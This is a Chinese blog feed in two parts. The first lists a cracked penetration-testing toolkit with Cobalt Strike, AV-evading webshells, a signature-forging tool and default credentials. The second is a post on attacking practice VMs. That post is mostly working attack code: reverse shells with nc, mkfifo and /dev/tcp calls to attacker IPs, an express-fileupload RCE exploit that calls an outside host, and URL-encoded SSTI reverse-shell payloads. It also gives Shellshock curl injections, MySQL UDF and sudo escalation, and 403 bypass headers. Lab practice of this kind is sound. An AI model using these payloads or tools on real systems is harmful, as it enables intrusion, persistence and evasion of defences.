编程工具:</strong></h3><ol><li><strong>GCC</strong></li><li><strong>Golang</strong></li><li><strong>Java:</strong></li></ol><ul><li><strong>jre1.8.0:已配置环境变量，系统默认调用java8</strong></li><li><strong>jre15.0.2:绿色版，如有特殊软件需要java15环境运行可直接调用/bin/java.exe即可</strong></li></ul><ol><li><strong>Nodejs</strong></li><li><strong>Python:</strong></li></ol><ul><li><strong>python2:python2命令启动（python2 test.py）</strong></li><li><strong>python3:python3命令启动（python3 test.py）</strong></li><li><strong>已集成本镜像所有python3工具的pip依赖库（如有遗漏未安装的库请自行安装）</strong></li><li><strong>使用pip命令调用python3 pip</strong></li></ul><ol><li><strong>VisualStudio 2022:社区版</strong></li></ol><h3 id="逆向工具"><a href="#逆向工具" class="headerlink" title="[+] 逆向工具:"></a><strong>[+] 逆向工具:</strong></h3><ol><li><strong>bat2exe:bat转exe工具</strong></li><li><strong>DetectItEasy:查壳工具</strong></li><li><strong>dnSpy:.Net逆向工具</strong></li><li><strong>exeScope:exe编辑工具</strong></li><li><strong>GreenHelper:exe绿化工具</strong></li><li><strong>HashMaker:hash工具</strong></li><li><strong>IDAPro:吾爱破解版</strong></li><li><strong>ILSpy:.Net逆向工具</strong></li><li><strong>jadx:java反编译工具</strong></li><li><strong>OllyDebug:exe调试工具</strong></li><li><strong>peidTool:查壳工具</strong></li><li><strong>SignTool:签名伪造工具</strong></li><li><strong>upxShell:upx加壳工具</strong></li><li><strong>vbs2exe:vbs转exe工具</strong></li><li><strong>x64dbg:exe调试工具</strong></li></ol><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="[+] 扫描工具:"></a><strong>[+] 扫描工具:</strong></h3><ol><li><strong>Acunetix:15.1.221109177（注册版）</strong></li></ol><ul><li><strong>username:<a href="mailto:admin@awvs.com">admin@awvs.com</a></strong></li><li><strong>password:<a href="mailto:Admin@awvs.com">Admin@awvs.com</a></strong></li></ul><ol><li><strong>AppScan:10.0.7（注册版）</strong></li><li><strong>Goby:2.0.5红队专版（含1288 poc）</strong></li><li><strong>Nessus:10.3.1（注册版）</strong></li></ol><ul><li><strong>username:admin</strong></li><li><strong>password:password</strong></li></ul><ol><li><strong>Nmap:端口扫描工具</strong></li><li><strong>RouterScan:C段扫描工具</strong></li><li><strong>ScanBox</strong></li></ol><blockquote><p><strong>AVScan 杀毒软件检测工具:</strong></p></blockquote><ul><li><strong>CheckAV（自己写的辣鸡代码，如有需要可以随便使用）</strong></li></ul><blockquote><p><strong>LeakScan 敏感文件扫描工具:</strong></p></blockquote><ul><li><strong><a href="https://github.com/H4ckForJob/dirmap">dirMap</a></strong></li><li><strong><a href="https://github.com/maurosoria/dirsearch">dirSearch</a></strong></li><li><strong><a href="https://github.com/rtcatc/Packer-Fuzzer">PackerFuzzer</a></strong></li><li><strong><a href="https://gitee.com/windyjxx/ScanTools">ScanTools</a></strong></li><li><strong>Yujian</strong></li><li><strong>GitHack</strong></li><li><strong>7KB WebPath Brute</strong></li><li><strong>7KB Ucenter Sniper</strong></li><li><strong>7KB WordPress Sniper</strong></li><li><strong>…</strong></li></ul><blockquote><p><strong>SubDomain 子域名探测工具:</strong></p></blockquote><ul><li><strong>FofaView:fofa查询工具</strong></li><li><strong><a href="https://github.com/ExpLangcn/InfoSearchAll">InfoSearchAll</a></strong></li><li><strong>Layer:子域名挖掘机</strong></li><li><strong><a href="https://github.com/shmilylty/OneForAll">OneforAll</a></strong></li><li><strong>Securitytrails:Securitytrails官方api脚本</strong></li><li><strong><a href="https://github.com/jinsezlb/SnowShadow">SnowShadow</a></strong></li><li><strong><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></li><li><strong><a href="https://github.com/projectdiscovery/subfinder">Subfinder</a></strong></li><li><strong><a href="https://github.com/xzajyjs/ThunderSearch">ThunderSearch</a></strong></li><li><strong><a href="https://github.com/ScriptKid-Beta/WebBatchRequest">WebBatchRequest</a></strong></li><li><strong><a href="https://github.com/Liqunkit/webfinder-next">WebFinder</a></strong></li><li><strong>…</strong></li></ul><blockquote><p><strong>更多扫描工具见 C:\Penetration\ScanTools\ScanBox</strong></p></blockquote><h3 id="权限工具"><a href="#权限工具" class="headerlink" title="[+] 权限工具:"></a><strong>[+] 权限工具:</strong></h3><ol><li><strong><a href="https://github.com/AntSwordProject/AntSword-Loader">Antsword</a>:蚁剑（已集成插件）</strong></li><li><strong><a href="https://github.com/rebeyond/Behinder">Behinder</a>:冰蝎（shell密码统一为rebeyond）</strong></li></ol><ul><li><strong>behinder 3.0 beta11</strong></li><li><strong>behinder 4.0.6</strong></li></ul><ol><li><strong><a href="https://github.com/TryGOTry/DogCs4.4">Cobaltstrike</a>:Dog 4.4 汉化版</strong></li></ol><ul><li><strong>使用<a href="https://github.com/Twi1ight/CSAgent">CSAgent</a>汉化</strong></li><li><strong>vps启动teamserver:sudo ./teamserver your_ip your_password random.profile</strong></li><li><strong>集成插件（C:\Penetration\ShellTools\CobaltStrike\Scripts）</strong></li><li><strong>adcollection</strong></li><li><strong><a href="https://github.com/hack2fun/BypassAV">bypassav</a></strong></li><li><strong><a href="https://github.com/DeEpinGh0st/Erebus">erebus</a></strong></li><li><strong>eval</strong></li><li><strong><a href="https://github.com/QAX-A-Team/EventLogMaster">eventlogmaster</a></strong></li><li><strong>ladon</strong></li><li><strong><a href="https://github.com/Mikasazero">mikasa</a></strong></li><li><strong><a href="https://github.com/pandasec888/taowu-cobalt-strike">taowu</a></strong></li></ul><ol><li><strong><a href="https://github.com/czz1233/GBByPass">ByPassBehinder</a>:jsp免杀工具</strong></li><li><strong><a href="https://github.com/BeichenDream/Godzilla">Godzilla</a>:哥斯拉</strong></li><li><strong>Hema:河马webshell查杀工具</strong></li><li><strong>Kali:WSL Kali Linux 2022.3</strong></li></ol><blockquote><p><strong>用户:</strong></p></blockquote><ul><li><strong>username:kali password:kali</strong></li><li><strong>username:root password:root</strong></li><li><strong>修改软件源为阿里云</strong></li><li><strong>完整安装Kali Linux所有软件包</strong></li></ul><ol><li><strong><a href="https://github.com/shack2/skyscorpion">Skyscorpion</a>:天蝎</strong></li><li><strong>Shell:免杀一句话木马（密码统一为cmd）</strong></li><li><strong><a href="https://github.com/tennc/webshell">Webshell</a>:webshell收集项目</strong></li><li><strong><a href="https://github.com/Macr0phag3/webshell-bypassed-human">WebshellBypassedHuman</a>:webshell免杀</strong></li><li><strong><a href="https://github.com/cseroad/Webshell_Generate">WebshellGenerate</a>:webshell生成工具</strong></li></ol><h3 id="流量工具"><a href="#流量工具" class="headerlink" title="[+] 流量工具:"></a><strong>[+] 流量工具:</strong></h3><ol><li><strong>BlueTeamTools:流量解密工具</strong></li><li><strong>BurpSuite:2022.1.1</strong></li></ol><ul><li><strong><a href="https://github.com/funkyoummp/burpsuitecn">汉化插件</a></strong></li><li><strong>集成插件:</strong></li><li><strong>VulnersScanner</strong></li><li><strong>ChangeU</strong></li><li><strong>ChunkedCodingConverter</strong></li><li><strong>DomainHunter</strong></li><li><strong>FakeIP</strong></li><li><strong>Hackbar</strong></li><li><strong>Sqlmap4burp</strong></li><li><strong>TurboIntruder</strong></li></ul><ol><li><strong>Fiddler:流量抓包工具（汉化版）</strong></li><li><strong>ftpServers:ftp开启工具</strong></li><li><strong>HackFirefox:firefox 49.0 集成插件版</strong></li><li><strong>ipChanger:ip代理工具</strong></li><li><strong>LiqunShield:webshell流量分析工具</strong></li><li><strong>NetSetMan:网络参数设置工具</strong></li><li><strong>OpenVPN:vpn工具</strong></li><li><strong>phpStudy:8.1集成环境</strong></li><li><strong>Proxifier:流量代理工具（汉化版）</strong></li><li><strong><a href="https://github.com/shadowsocks/shadowsocks-windows">ShadowSocks</a>:科学上网工具</strong></li><li><strong>TorBowser:洋葱浏览器</strong></li><li><strong><a href="https://github.com/2dust/v2rayN">v2ray</a>:科学上网工具</strong></li><li><strong>WireShark:流量抓包分析工具</strong></li><li><strong><a href="https://github.com/yaklang/yakit">Yakit</a></strong></li></ol><h1 id="全套虚拟机镜像："><a href="#全套虚拟机镜像：" class="headerlink" title="全套虚拟机镜像："></a>全套虚拟机镜像：</h1><ol><li><strong>Windows 7 x64</strong></li><li><strong>Windows 8 x64</strong></li><li><strong>Windows 10 x64</strong></li><li><strong>Windows Server 2008 x64</strong></li><li><strong>Windows Server 2012 x64</strong></li><li><strong>Windows Server 2016 x64</strong></li><li><strong>Windows Server 2019 x64</strong></li><li><strong>Ubuntu 20 x64</strong></li></ol><p><strong>所有虚拟机镜像均安装：</strong></p><ul><li><strong>VMTools</strong></li><li><strong>7z</strong></li><li><strong>Microsoft Visual C++ 2008-2022 运行库</strong></li><li><strong>密钥或激活工具激活</strong></li></ul><p><strong>可供测试软件，环境搭建等用途。</strong> <strong>虚拟机账号密码已备注在VMware描述栏处，请注意查看。</strong></p><h1 id="下载链接："><a href="#下载链接：" class="headerlink" title="下载链接："></a>下载链接：</h1><blockquote><p><strong><a href="https://github.com/makoto56/penetration-suite-toolkit/releases/tag/v4.0">https://github.com/makoto56/penetration-suite-toolkit/releases/tag/v4.0</a></strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022-12-06-更新说明&quot;&gt;&lt;a href=&quot;#2022-12-06-更新说明&quot; class=&quot;headerlink&quot; title=&quot;2022.12.06 更新说明:&quot;&gt;&lt;/a&gt;&lt;strong&gt;2022.12.06 更新说明:&lt;/strong&gt;&lt;/h1&gt;&lt;o</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透学习靶机打靶思路与方法</title>
    <link href="http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/</id>
    <published>2022-11-30T10:15:09.000Z</published>
    <updated>2022-12-06T06:24:02.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一．对靶机进行信息收集"><a href="#一．对靶机进行信息收集" class="headerlink" title="一．对靶机进行信息收集"></a><strong>一．对靶机进行信息收集</strong></h2><p><strong>1.首先对目标存活靶机发起嗅探：</strong></p><p>①sudo arp-scan -l 针对网卡发起扫描存活主机</p><p>②arping扫描：for i in (seq 1 254);do arping −c 2 10.0.2.i; done</p><p>③netdiscover：sudo netdiscover -r 10.0.2.0/16</p><p>④nmap主机发现：nmap -sn 10.0.2.4/24</p><p>⑤fping侦探：fping -gaq 10.0.2.0/24</p><p><strong>2.对目标主机开放端口及服务发起探测</strong></p><p>①masscan快速扫描</p><p>②nmap进行扫描</p><p>(1)nmap -p- ip </p><p> (2)nmap -p22,80,.. -A ip </p><p>(3)当目标主机开启防火墙时：nmap –script=firewalk –traceroute ip 详细绕过文章参考：</p><p><a href="https://blog.csdn.net/weixin_43510203/article/details/107596120">https://blog.csdn.net/weixin_43510203/article/details/107596120</a></p><p><strong>3.对非web端口的服务发起迅速的嗅探，尝试使用nday进行攻击</strong></p><p>①kali自带的exploitdb</p><p>②msf进行攻击嗅探</p><p>③可以使用搜索引擎尝试搜索最新还未收录的day</p><p>④对如mysql及ssh端口开放的服务可以使用hydra进行密码的爆破</p><p><strong>4.开始进行web端口外部打点尝试</strong></p><p>首先对目标端口开放的功能点发起测试，</p><p>如登录框，弱密码，xss，爆破，sql注入等，尝试能否直接拿到shell，</p><p><strong>如果首界面得不到有效信息</strong>，开始进行路径爆破，对路径爆破得到的路径进行详细的侦测，流程及思路与测试主页面一致，</p><p>将大量收集得到的信息进行整合记录，查看每一个收集得到的路径的页面源代码</p><p>如果发现有<strong>子域名未绑定</strong>，搜集得到的子域名进行绑定，再次对子域名发起攻击，包括中间件及应用，通过searchsploit搜索可以利用的版本漏洞尝试进行突破，这是外部打点最为重要的一步。</p><p>①使用feroxbuster进行路径发现：feroxbuster –url <a href="http://10.0.2.9/">http://10.0.2.9</a></p><p>②使用gobuster进行路径发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.26-w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure><p>使用gobuster进行更加针对性的扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -r -u http://10.0.2.16/-x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure><p>使用gobuster进行子域名的爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）gobuster vhost -u http://cereal.ctf:44441-w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt</span><br><span class="line">（2）gobuster vhost -u http://votenow.local/-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep “Status:200”</span><br></pre></td></tr></table></figure><p>③构建自己的参数字典进行参数爆破：123abc’”(&lt;,;/%</p><p>④使用fuff进行双参数爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt :PARAM</span><br></pre></td></tr></table></figure><p>-w val.txt:VAL -u <a href="http://10.0.2.26/secret/evil.php?PARAM=VAL-fs">http://10.0.2.26/secret/evil.php?PARAM=VAL-fs</a> 0 -fs</p><p>是为了过滤掉无效的内容</p><p>使用fuff进行模糊参数爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt-u http://10.0.2.26/secret/evil.php?FUZZ=…/index.html-fs 0</span><br></pre></td></tr></table></figure><p>⑤使用dirsearch进行路径爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（1）dirsearch -u http://10.0.2.43-f -e html,php,txt -w /usr/share/seclists/Discovery/WebContent/directory-list-2.3-small.txt（2）dirsearch -u http://10.1.8.133-f -e html,php,txt -w /usr/share/wordilsts/dirb/common.txt</span><br></pre></td></tr></table></figure><p>⑥利用cewl生成特定的字典</p><p>⑦利用dirb来进行路径爆破 使用dirb进备份文件检查 dirb <a href="http://cereal.ctf/blog/-x">http://cereal.ctf/blog/-x</a> .bak,back</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="二．一些靶机打点的工具和知识："><a href="#二．一些靶机打点的工具和知识：" class="headerlink" title="二．一些靶机打点的工具和知识："></a><strong>二．一些靶机打点的工具和知识：</strong></h1><p><strong>1.当目标靶机nc中不存在-e参数时两种串联攻击方法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）nc 10.0.2.4 3333 | /bin/bash | nc 10.0.2.4 4444 </span><br><span class="line">（2）rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.2.15 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><strong>2.cyberchef平台上可以进行多种多样的加密与解密</strong></p><p><strong>3.node.js下的express-fileupload模块存在参数污染远程命令代码执行漏洞</strong></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd = ‘bash -c “bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1”’</span><br><span class="line">pollute</span><br><span class="line">requests.post(‘http://p6.is:7777’, files = &#123;‘proto.outputFunctionName’: (None,</span><br><span class="line">f&quot;x;console.log(1);process.mainModule.require(‘child_process’).exec(‘&#123;cmd&#125;’);x&quot;)&#125;)execute command</span><br><span class="line">requests.get(‘http://p6.is:7777’)</span><br></pre></td></tr></table></figure><p><strong>4.node是一个类似于java的运行环境，</strong></p><p>利用node反弹shell，sudo node -e ‘child_process.spawn(“/bin/bash”,{stdio:[0,1,2]})’</p><p><strong>5.bash指令受限为非交互式的shell时的详细操作（只适用于bshell）：</strong></p><p>ctrl+z 将获得的shell进程隐藏</p><p>stty raw -echo stty echo 取消不显设置 rstty时一个用来改变并打印终端行设置的常用命令。</p><p>fg 将后台的命令调到前台来 发现仍然无法正常执行，原因是因为kali</p><p>上面用的是zshell不是bshell，但是目标靶机上用的是bshell</p><p>chsh -s /bin/bash 将kali上的zshell改为bshell</p><p>ctrl+r 重启kali</p><p>echo $SHELL 得到bshell</p><p>重启后:stty raw -echo</p><p>这个地方如果出现执行后无法执行命令，输入python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p><p>就可以得到www-data@wp:/var/www/html/wordpress$</p><p>export SHELL=/bin/bash</p><p>export TREM=screen</p><p>stty rows 38 columns 116</p><p>reset</p><p>发现已经实现了所有的功能包括补齐等等</p><p><strong>6.不管是打靶还是在真实的渗透测试中，都需要尽可能的多获得shell，以确保自己有足够的的shell</strong></p><p><strong>7.xmlrpc可以远程执行命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import xmlrpc.client</span><br><span class="line">with xmlrpc.client.ServerProxy(“http://localhost:8000/”) as </span><br><span class="line">proxy:</span><br><span class="line">print(str(proxy.cpu()))</span><br></pre></td></tr></table></figure><p><strong>8.文件包含下的重点伪协议读取</strong></p><p>（1）php：php://filter/convert.base64-encode/resource=evil.php</p><p>（2）gophor协议下的ssrf工具 git clone <a href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p><p><strong>9.当可以任意读取目标靶机文件时，利用访问公私钥免于账号密码登录</strong></p><p>默认存放位置:公钥 /home/kali/.ssh/authorized_keys 私钥 /home/kali/id_rsa</p><p>将拷贝下来的私钥赋予600权限 chmod 600 id_rsa</p><p>如果私钥也被加密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py ~/id_rsa &gt; ~/hash 进行转化john hash --wordlist=rockyou.txt 破解得到了密码文</span><br></pre></td></tr></table></figure><p><strong>10.有时候如果没有tcp传输的端口，可以怀疑udp53端口作为同一个域之间传输数据的方式，扫描udp53端口 sudo nmap -p53 -sU 10.0.2.15</strong></p><p><strong>11.在hosts更改绑定后发现主机记录没有改变时，可以使用dns区域访问，</strong>axfr区域传输后会返回域名下的所有记录，dig axfr @10.0.2.28 blackhat.local发现存在axfr漏洞，发现存在新域名,均绑定到hosts里面</p><p><strong>12.模板注入通杀代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+1bcxyz&#125;%3C%1+abcxyz%%3E[acbxyz]$&#123;77&#125;,&#123;&#123;77&#125;&#125;</span><br></pre></td></tr></table></figure><p>利用模板注入漏洞进行反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(‘bash -c “bash -i &gt;&amp; /dev/tcp/10.0.2.7/4444 0&gt;&amp;1”’)&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果被过滤掉可以对编码进行混淆绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F4444%2000%3E%261%22%27%29%7D%7D</span><br></pre></td></tr></table></figure><p><strong>13.对网站指纹进行探测：whatweb</strong></p><p><strong>14.对页面403做403页面绕过</strong></p><p>①旁站绕过403：将主机名进行替换</p><p>②覆盖URL进行绕过：</p><p>GET / HTTP/1.1</p><p>X-Original-URL: /auth/login</p><p>或者X-Rewrite-URL</p><p>X-Oringinating-IP:127.0.0.1 X-Forwarded-For:127.0.0.1 X-Remote-IP:127.0.0.1</p><p>③通过referer头部修改</p><p>ReFerer:<a href="http://xxx/auth/login">http://xxx/auth/login</a></p><p><strong>15.john进行密码爆破</strong></p><p>首先将文件保存成hash值zip2john a.zip &gt;hash</p><p>将wordlists里的Rockyou字典解压保存到桌面</p><p>john hash –wordlists=rockyou.txt得到密码ragnarok123</p><p><strong>16.使用steghide工具进行探测隐写数</strong>，steghide info king 使用binwalk进行二进制的分析，binwalk -B king</p><p><strong>17.rpyc远程管理进行提权 添加sudo权限的exp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import rpyc</span><br><span class="line">def shell():</span><br><span class="line">import os</span><br><span class="line">os.system(“sudo usermod -a -G sudo ragnar”)</span><br><span class="line">conn = rpyc.classic.connect(“localhost”)</span><br><span class="line">fn=conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p><strong>18.利用破壳漏洞进行打点</strong></p><p>（1）查看所有的后缀名为cgi，sh的文件，使用破壳漏洞尝试控制系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.36/cgi-bin/-f -e cgi,sh</span><br></pre></td></tr></table></figure><p>发现带有这些后缀名的文件返回状态码500</p><p>（2）使用nmap进行破壳漏洞进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.16</span><br><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 10.0.2.16</span><br></pre></td></tr></table></figure><p>发现均存在破壳漏洞</p><p>（3）使用curl工具进行参数的注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H “user-agent: () &#123; :; &#125;, echo; echo; /bin/bash -c ‘which nc’” \http://10.0.2.16/cgi-bin/shell.sh</span><br><span class="line">curl -H “user-agent: () &#123; :; &#125;, echo; echo; /bin/bash -c ‘nc -e /bin/bash 10.0.2.15 4444’” \http://10.0.2.16/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure><p>本机开启侦听端口，发现连接成功突破外部拿下shell</p><p><strong>19.StegSeek高效的密码爆破工具</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt 破解密码成功</span><br></pre></td></tr></table></figure><p>再加上-xf参数得到文件fil</p><p><strong>20.当存在火狐存储的账号密码时，</strong>可以使用firefox_decrypt-master工具进行破解得到账号密码</p><p><strong>21.fernet，是</strong>一种python下的加密算法,解密代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b’…’</span><br><span class="line">f = Fernet(key)</span><br><span class="line">token =b’…’</span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure><p><strong>22.WebDAV服务漏洞利用工具DAVTest:</strong></p><p>davtest -url <a href="http://10.1.8.133/webdav-auth">http://10.1.8.133/webdav-auth</a> yamdoot:Swarg</p><p>上传反弹shell的php文件 /usr/share/webshells/php/php-reverse-shell.php</p><p>davtest -url <a href="http://10.1.8.133/webdav-auth">http://10.1.8.133/webdav-auth</a> yamdoot:Swarg -uploadfile php-reverse-shell.php</p><p>-uploadloc rev.php</p><p><strong>23.wkhtmltppdf组件，</strong>可以将html代码转换成pdf，该组件下存在exp可以远程执行文件，在原来xss的地方尝试读取文件</p><p><strong>24.enum4linux是Kali Linux自带的一款信息收集工具。</strong>它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000/XP/2003，但在Windows 7/10系统，部分功能受限</p><p><strong>25.rbash绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa tom@192.168.182.135 -t “bash --noprofile”</span><br><span class="line">sudo mysql -u tom -p</span><br><span class="line">! Bash</span><br></pre></td></tr></table></figure><p><strong>26.针对139及445端口的smb服务发起攻击</strong>，使用smbclient工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L \\191.268.182.147</span><br><span class="line">smbclient -L \\191.268.182.147\\ITDEPT</span><br></pre></td></tr></table></figure><h1 id="三．进行linux下的提权"><a href="#三．进行linux下的提权" class="headerlink" title="三．进行linux下的提权"></a><strong>三．进行linux下的提权</strong></h1><p><strong>1.首先使用 uname -a lsb_release -a对目标靶机进行版本机内核信息收集，</strong>使用exploitdb内的内核版本漏洞尝试能否直接提权</p><p>两个需要特别注意的内核漏洞：</p><p>（1）脏牛内核漏洞：</p><p>漏洞范围：linux kernel 4.8.3, 4.7.9, 4.4.2&gt;Linux内核 &gt;= 2.6.22</p><p>（2）CVE-2021-3493：</p><p>影响版本Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM</p><p>还可以使用linux-exploit-suggester进行自动化枚举内核的提权漏洞</p><p><strong>2.查找suid权限的文件</strong>，尝试进行权限继承或者通过该文件的内容发起进一步探索</p><p>权限继承 例：一个名为update_cloudav的文件 权限为rwsr 即存在suid权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav “a | nc 10.0.2.4 5555 | /bin/bash |nc 10.0.2.4 6666”进行suid</span><br></pre></td></tr></table></figure><p>权限继承</p><p><strong>3.进行sudo权限检查 s</strong>udo -l 尝试利用sudo权限获得root权限例</p><p>当awk存在root权限时，使用命令进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk ‘BEGIN &#123;system(“/bin/bash”)&#125;’</span><br></pre></td></tr></table></figure><p><strong>4.su提权：</strong>需要多注意自己得到过的有效密码信息，尝试看能不能直接提权</p><p><strong>5.mysql数据库提权：</strong></p><p>（1）输入! bash !可以直接执行系统命令，！是system函数的简写，跳出mysql直接得到root权限（</p><p>（2）udf提权：</p><p>find / -iname”mysqludf” -type f 2&gt;/dev/null linux 的so等于windos的dll 都属于动态链接的文件</p><p>show variable like ‘%plugins%’           将该文件传到目标靶机上去，查看mysql的插件，得到存放插件的路径为/usr/lib/mysql/plugin/ 将so文件写入到插件里面，再创建可以执行命令的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table aaa(line blob);</span><br><span class="line">insert into aaa values(load_file(‘/tmp/udf.so’));</span><br><span class="line">select * from aaa into dumpfile /usr/lib/mysql/plugin/</span><br><span class="line">create function sys_exec returns integer soname ‘udf.so’;</span><br><span class="line">select sys_exec(‘id &gt; /tmp/out.txt’);</span><br></pre></td></tr></table></figure><p>查看目录里面发现执行成功，开始写入反弹shell的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sysy_exex(‘nc 10.0.2.15 4444 -e /bin/bash’);</span><br></pre></td></tr></table></figure><p><strong>6.检查/etc/passwd是否具有可写权限，</strong>可以尝试将账号密码直接写入得到root权限，openssl passwd -1 -1指的是一种加密算法，将加密后的密码写入passw中的root账号</p><p><strong>7.利用capabilities进行提权：</strong>例：</p><p>capabilities是一个权限管理功能，设置权限赋予</p><p>setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</p><p>首先进行查询指令 /sbin/getcap getcap -r / 2&gt;/dev/null</p><p>发现一个python2.7的程序拥有capabilities权限</p><p>ps -U root 查看所有以root账号运行的进程 或者 ps -aef | grep root</p><p>下载利用权限利用的python进程注入脚本wget</p><p>python2.7 inject.py 862 